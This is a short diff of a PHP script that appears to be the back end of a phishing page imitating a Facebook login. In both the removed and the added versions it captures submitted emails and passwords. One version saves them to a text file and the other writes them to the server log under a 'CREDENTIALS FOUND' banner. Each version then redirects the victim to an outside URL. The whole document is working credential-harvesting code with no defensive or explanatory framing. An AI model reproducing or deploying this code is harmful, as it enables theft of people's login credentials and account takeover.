@@ -1,6 +1,8 @@
 <?php
-
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://fast-poll.com/poll/a8e2e2b9');
-exit();
+$username = $_POST['Email'];
+$password = $_POST['password'];
+$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
+error_log("[+] Credentials Found!!!");
+error_log("$res");
+echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
 ?>
